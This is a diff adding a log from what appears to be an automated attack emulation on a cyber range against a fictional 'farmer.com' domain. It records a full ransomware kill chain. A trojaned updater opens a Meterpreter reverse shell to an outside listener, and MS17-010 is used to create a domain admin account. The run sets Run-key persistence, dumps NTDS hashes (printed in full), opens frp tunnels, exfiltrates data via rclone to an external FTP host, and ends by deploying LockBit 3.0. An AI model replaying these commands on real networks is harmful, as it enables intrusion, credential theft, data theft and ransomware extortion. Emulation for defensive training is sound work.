@@ -1,0 +1,227 @@
+2025-09-11 09:02:41 Start module Initial Access - Exploit Public-Facing Application - ia_win_exploit_web!
+2025-09-11 09:02:41 Clean temp folder
+2025-09-11 09:02:56 Create command execute php web shell file.
+2025-09-11 09:02:56 #################################################################
+2025-09-11 09:02:56 ######################Resource Preparation#######################
+2025-09-11 09:02:56 #################################################################
+2025-09-11 09:02:56 Access Fake Vender 1's web site 219.203.25.213
+2025-09-11 09:02:56 Exploit Supply Chain Application File Upload vulnerability.
+2025-09-11 09:02:56 Webshell URL : http://219.203.25.213/feedback/uploads/cmdexec.php
+2025-09-11 09:02:56 Create fake application updater.exe. Vendor1Admin will download the tool and run it.
+2025-09-11 09:03:09 Started Metasploit listener on address: 101.203.25.203 port: 8000
+2025-09-11 09:03:09 #################################################################
+2025-09-11 09:03:09 ######################Initial Access#############################
+2025-09-11 09:03:09 #################################################################
+2025-09-11 09:03:10 Start Waiting for user VenderAdmin download http://219.203.25.213:80/update.exe
+2025-09-11 09:03:10 Waiting for a new session back - 0
+2025-09-11 09:03:15 Waiting for a new session back - 5
+2025-09-11 09:03:20 Waiting for a new session back - 10
+2025-09-11 09:03:25 Waiting for a new session back - 15
+2025-09-11 09:03:30 Waiting for a new session back - 20
+2025-09-11 09:03:35 Waiting for a new session back - 25
+2025-09-11 09:03:40 Waiting for a new session back - 30
+2025-09-11 09:03:45 Waiting for a new session back - 35
+2025-09-11 09:03:50 Waiting for a new session back - 40
+2025-09-11 09:03:55 Waiting for a new session back - 45
+2025-09-11 09:04:00 Waiting for a new session back - 50
+2025-09-11 09:04:05 Waiting for a new session back - 55
+2025-09-11 09:04:10 Waiting for a new session back - 60
+2025-09-11 09:04:15 VenderAdmin download updater.exe, Session come back, Successfully get initial access point.
+2025-09-11 09:04:23 #############################################################
+2025-09-11 09:04:23 ######################Tunneling##############################
+2025-09-11 09:04:23 #############################################################
+2025-09-11 09:04:23 Set automatically tunnel to 10.64.x.x, via Session 1
+2025-09-11 09:04:24 Create socks.ini for Proxy Chains
+2025-09-11 09:04:29 ##################################################################
+2025-09-11 09:04:29 ######################Privilege Escalation########################
+2025-09-11 09:04:29 ##################################################################
+2025-09-11 09:04:29 Start Privlege Escalation by exploit MS17-010 to create account systemadmin on Domain Controller (10.64.2.8)
+2025-09-11 09:04:29 Use service to delete account systemadmin
+2025-09-11 09:04:29 Use service to add account systemadmin
+2025-09-11 09:04:29 Use service to add account systemadmin to Domain Admins group
+2025-09-11 09:05:34 [*] There are currently no routes defined.
+
+Active sessions
+===============
+
+Id Name Type Information Connection
+-- ---- ---- ----------- ----------
+1 meterpreter x64/windows FARMER\vendor1admin @ WINVENDOR1CONN 101.203.25.203:8000 -> 202.203.25.202:51124 (10.64.101.15)
+
+CMD => add
+SUBNET => 10.64.0.0
+NETMASK => 255.255.0.0
+SESSION => 1
+[*] Running module against WINVENDOR1CONN
+[*] Adding a route to 10.64.0.0/255.255.0.0...
+[+] Route added to subnet 10.64.0.0/255.255.0.0.
+[*] Post module execution completed
+SRVHOST => 101.203.25.203
+SRVPORT => 1080
+VERSION => 4a
+[*] Auxiliary module running as background job 1.
+[*] Starting the SOCKS proxy server
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+RHOST => 10.64.2.8
+SMBDomain => farmer.com
+payload => windows/x64/exec
+CMD => net user systemadmin /delete /do
+CMD => net user systemadmin Password123 /add /do
+CMD => net group "Domain Admins" systemadmin /add /do
+
+2025-09-11 09:05:34 #############################################################
+2025-09-11 09:05:34 ######################Persistence##############################
+2025-09-11 09:05:34 #############################################################
+2025-09-11 09:05:34 Start set Persistence on Registry HKCU/Software/Microsoft/Windows/CurrentVersion/Run
+2025-09-11 09:05:35 Waiting Response.
+2025-09-11 09:05:40 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+SESSION => 1
+LHOST => 101.203.25.203
+LPORT => 5443
+[*] Exploit running as background job 2.
+[*] Running persistent module against WINVENDOR1CONN via session ID: 1
+[+] Persistent VBS script written on WINVENDOR1CONN to C:\Users\VENDOR~1\AppData\Local\Temp\1\UkCWiISUMwi.vbs
+[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QloiYBVMCfXzf
+[+] Installed autorun on WINVENDOR1CONN as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QloiYBVMCfXzf
+[*] Clean up Meterpreter RC file: /root/.msf4/logs/persistence/WINVENDOR1CONN_20260319.2537/WINVENDOR1CONN_20260319.2537.rc
+
+2025-09-11 09:05:40 Use Following metasploit commands to get the session after machine reboots
+use exploit/multi/handler
+set ExitOnSession false
+set payload windows/meterpreter/reverse_tcp
+set LHOST 101.203.25.203
+set LPORT 5443
+exploit -j
+Then reboot the machine, see if new sessions comeback.
+
+2025-09-11 09:05:40 #############################################################
+2025-09-11 09:05:40 ##################Credential Access##########################
+2025-09-11 09:05:40 #############################################################
+2025-09-11 09:05:40 Set dump user hashes from Domain Controller via crackmapexec NTDS.dit
+2025-09-11 09:05:40 Commands: proxychains -f socks.ini crackmapexec smb 10.64.2.8/32 -usystemadmin -pPassword123 --ntds vss
+2025-09-11 09:06:29 SMB 10.64.2.8 445 PWDCACT01 [*] Windows Server 2016 Standard 14393 x64 (name:PWDCACT01) (domain:farmer.com) (signing:True) (SMBv1:True)
+SMB 10.64.2.8 445 PWDCACT01 [+] farmer.com\systemadmin:Password123 (Pwn3d!)
+SMB 10.64.2.8 445 PWDCACT01 [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB 10.64.2.8 445 PWDCACT01 Administrator:500:aad3b435b51404eeaad3b435b51404ee:fe6e2d4f265d0808b0ab46637d1268c0:::
+SMB 10.64.2.8 445 PWDCACT01 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB 10.64.2.8 445 PWDCACT01 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB 10.64.2.8 445 PWDCACT01 PWDCACT01$:1000:aad3b435b51404eeaad3b435b51404ee:92e3aefd8a969c3edb15df377959df3f:::
+SMB 10.64.2.8 445 PWDCACT01 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:95f178ab0f424bed7e71355410e4e05a:::
+SMB 10.64.2.8 445 PWDCACT01 PW12MCAFEE$:1103:aad3b435b51404eeaad3b435b51404ee:d1c01452473b16d91ca64fa28290bcce:::
+SMB 10.64.2.8 445 PWDCACT01 PW16SPLUNK$:1104:aad3b435b51404eeaad3b435b51404ee:4c16410dd8bd09b8f2ab63a320d69584:::
+SMB 10.64.2.8 445 PWDCACT01 DW10COREDEV$:1105:aad3b435b51404eeaad3b435b51404ee:0d2f45b89fefca4d5ae687fffd051340:::
+SMB 10.64.2.8 445 PWDCACT01 WORKSTATION01$:1106:aad3b435b51404eeaad3b435b51404ee:c37081317db8a74dfc7ca154c958c468:::
+SMB 10.64.2.8 445 PWDCACT01 WORKSTATION02$:1107:aad3b435b51404eeaad3b435b51404ee:ef42973edbddcf05b31133aef37c6eb5:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\analyst01:1108:aad3b435b51404eeaad3b435b51404ee:fe6e2d4f265d0808b0ab46637d1268c0:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\analyst02:1109:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\coredev:1111:aad3b435b51404eeaad3b435b51404ee:66e599ae2b6a3a80f9c9c3c26e481beb:::
+SMB 10.64.2.8 445 PWDCACT01 WORKSTATION1$:1112:aad3b435b51404eeaad3b435b51404ee:c6b8b781f506104be9a4061b3f095350:::
+SMB 10.64.2.8 445 PWDCACT01 0WINWS02$:1113:aad3b435b51404eeaad3b435b51404ee:03cd6d0a20c185c0ad8ed0a7fe23750f:::
+SMB 10.64.2.8 445 PWDCACT01 0WINWS03$:1114:aad3b435b51404eeaad3b435b51404ee:1f30807a25e8383d04f2523747e98300:::
+SMB 10.64.2.8 445 PWDCACT01 0WINWS04$:1115:aad3b435b51404eeaad3b435b51404ee:7e93e6b2904781ce1cf57a2106f247e8:::
+SMB 10.64.2.8 445 PWDCACT01 analyst03:1116:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 analyst04:1117:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 analyst05:1118:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 0WINWS05$:1119:aad3b435b51404eeaad3b435b51404ee:672363fdf22c0fac14ce1e471ce1dcd1:::
+SMB 10.64.2.8 445 PWDCACT01 WINXPX86$:1120:aad3b435b51404eeaad3b435b51404ee:2e5255035c83f7126412cebdaa210346:::
+SMB 10.64.2.8 445 PWDCACT01 winxpadmin:1121:aad3b435b51404eeaad3b435b51404ee:d396aca11068cee33ce8b0a7107263b7:::
+SMB 10.64.2.8 445 PWDCACT01 PW19INTERNAL$:1122:aad3b435b51404eeaad3b435b51404ee:873c928b7d9c15f3de5c6fe189e4e39d:::
+SMB 10.64.2.8 445 PWDCACT01 0WCNDESKTOP01$:1123:aad3b435b51404eeaad3b435b51404ee:aa9c5a1a134d806f46c8cacaf4e814ac:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\hr:1125:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\infra:1128:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\legal:1129:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\operator:1130:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\business:1131:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 0WINWS01$:1133:aad3b435b51404eeaad3b435b51404ee:bf0eb1e8afce8271e2684c7aa979b072:::
+SMB 10.64.2.8 445 PWDCACT01 WINDOWS7$:1135:aad3b435b51404eeaad3b435b51404ee:eafe49155f504e089cd1ab1efc9c9202:::
+SMB 10.64.2.8 445 PWDCACT01 WKSWIN7$:1136:aad3b435b51404eeaad3b435b51404ee:ebe199d3b1d021c1c9c181f718e46c4b:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\regsvc:1137:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 HFISH335$:1138:aad3b435b51404eeaad3b435b51404ee:470f0353e74a8eb51ab46cbfc4b50c05:::
+SMB 10.64.2.8 445 PWDCACT01 DBSERVER1$:1139:aad3b435b51404eeaad3b435b51404ee:a89afa021d8eaef46afcdcfec25a3af0:::
+SMB 10.64.2.8 445 PWDCACT01 WKSWIN7X64$:1140:aad3b435b51404eeaad3b435b51404ee:501e2ae349b0c15242836f20d248ff83:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\dbadmin:1141:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 FILESERVER1$:1142:aad3b435b51404eeaad3b435b51404ee:79daee9a3d67b0dadd1677daf3d597d3:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\fsadmin:1144:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\honeypotadmin:1145:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\avadmin:1146:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 TECHDEV$:1147:aad3b435b51404eeaad3b435b51404ee:d3ce533c68e527506b7fefea01249929:::
+SMB 10.64.2.8 445 PWDCACT01 APPSVR2019$:1151:aad3b435b51404eeaad3b435b51404ee:b4189619977faa7142060b05ccc90a59:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\appadmin:1152:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\vendor1admin:1601:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 WINVENDOR1CONN$:1602:aad3b435b51404eeaad3b435b51404ee:990095a4a00472f656143256ab92ddc0:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\trader:4101:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 0WINWS06$:4102:aad3b435b51404eeaad3b435b51404ee:589370d0fdc26ea9042cc551f376b517:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\backupadmin:4601:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 WINBAKCUP$:4602:aad3b435b51404eeaad3b435b51404ee:94cbaf221ae0978c93849e5368ab1cfa:::
+SMB 10.64.2.8 445 PWDCACT01 WININTWEB$:5101:aad3b435b51404eeaad3b435b51404ee:cd22d288e7a94ceb6bcaadc9e290f00a:::
+SMB 10.64.2.8 445 PWDCACT01 farmer.com\helpdesk:6601:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+SMB 10.64.2.8 445 PWDCACT01 1WINWS07$:6602:aad3b435b51404eeaad3b435b51404ee:e988ea1cc4584bf27daaf00608a5ea9d:::
+SMB 10.64.2.8 445 PWDCACT01 [+] Dumped 54 NTDS hashes to /root/.cme/logs/PWDCACT01_10.64.2.8_2026-03-19_172542.ntds of which 26 were added to the database
+
+2025-09-11 09:06:29 ###############################################################
+2025-09-11 09:06:29 ######################Lateral Movement#########################
+2025-09-11 09:06:29 ###############################################################
+2025-09-11 09:06:29 Started create frps listener on address: 219.203.25.204:7000 (Dark net Web Server)
+2025-09-11 09:06:29 Domain Controller address: 219.203.25.204:3360
+2025-09-11 09:06:29 Use below command to connect E.g. ---- xfreerdp /u:systemadmin /d:farmer.com /v:219.203.25.204:3360 /cert-ignore
+2025-09-11 09:06:29 File Server address: 219.203.25.204:3361
+2025-09-11 09:06:29 Internal Web Server address: 219.203.25.204:3362
+2025-09-11 09:06:29 Backup Server address: 219.203.25.204:3363
+2025-09-11 09:07:23 Started lateral movement via main_agents, move to 0WinWS04
+2025-09-11 09:07:23 Server on BenEXT, and connect to CRWebServer
+2025-09-11 09:07:23 main_agents.exe's call back address is 101.203.25.209:80
+2025-09-11 09:07:48 On Agent, the file is C:\Windows\System32\excel.exe
+2025-09-11 09:07:48 #################################################################
+2025-09-11 09:07:48 ##################Collection#####################################
+2025-09-11 09:07:48 #################################################################
+2025-09-11 09:07:48 Start Exfiltration Internal Oracle Data
+[*] Starting interaction with 1...
+
+[*] Uploading : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/c.cmd -> c.cmd
+[*] Uploaded 158.00 B of 158.00 B (100.0%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/c.cmd -> c.cmd
+[*] Completed : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/c.cmd -> c.cmd
+[*] Uploading : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/pyfolder/oraext.txt -> oraext.py
+[*] Uploaded 5.47 KiB of 5.47 KiB (100.0%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/pyfolder/oraext.txt -> oraext.py
+[*] Completed : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/pyfolder/oraext.txt -> oraext.py
+Process 3828 created.
+[*] Backgrounding session 1...
+2025-09-11 09:08:10 copy extracted result to File Share server 
+
+2025-09-11 09:08:11 #############################################################
+2025-09-11 09:08:11 ##################Exfiltration###############################
+2025-09-11 09:08:11 #############################################################
+2025-09-11 09:08:11 Start Exfiltration by Rclone Channel
+[*] Starting interaction with 1...
+
+[*] Uploading : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/rclone.conf -> rclone.conf
+[*] Uploaded 104.00 B of 104.00 B (100.0%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/rclone.conf -> rclone.conf
+[*] Completed : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/rclone.conf -> rclone.conf
+[*] Uploading : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/c.cmd -> c.cmd
+[*] Uploaded 314.00 B of 314.00 B (100.0%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/c.cmd -> c.cmd
+[*] Completed : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/temp/c.cmd -> c.cmd
+[*] Uploading : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 8.00 MiB of 60.29 MiB (13.27%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 16.00 MiB of 60.29 MiB (26.54%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 24.00 MiB of 60.29 MiB (39.81%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 32.00 MiB of 60.29 MiB (53.08%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 40.00 MiB of 60.29 MiB (66.35%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 48.00 MiB of 60.29 MiB (79.62%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 56.00 MiB of 60.29 MiB (92.88%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Uploaded 60.29 MiB of 60.29 MiB (100.0%): /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+[*] Completed : /home/northfarmer/Desktop/eclipse-workspace/cyberrange2025_advance_with_steps/3rdparty/execute/rclone.exe -> rclone.exe
+Process 3604 created.
+rc.conf
+###########################
+[ftp]
+	type = ftp
+	host = 219.203.25.202
+	port = 21
+###########################
+
+
+2025-09-11 09:08:43 ###############################################################
+2025-09-11 09:08:43 ##################Impact#######################################
+2025-09-11 09:08:43 ###############################################################
+2025-09-11 09:08:43 Start Transfer Lock Bit 3.0 to to File Share server 10.64.2.61 and running
+2025-09-11 09:09:20 Running Lock Bit 3.x automatically.
+2025-09-11 09:09:20 Process finished successfully!
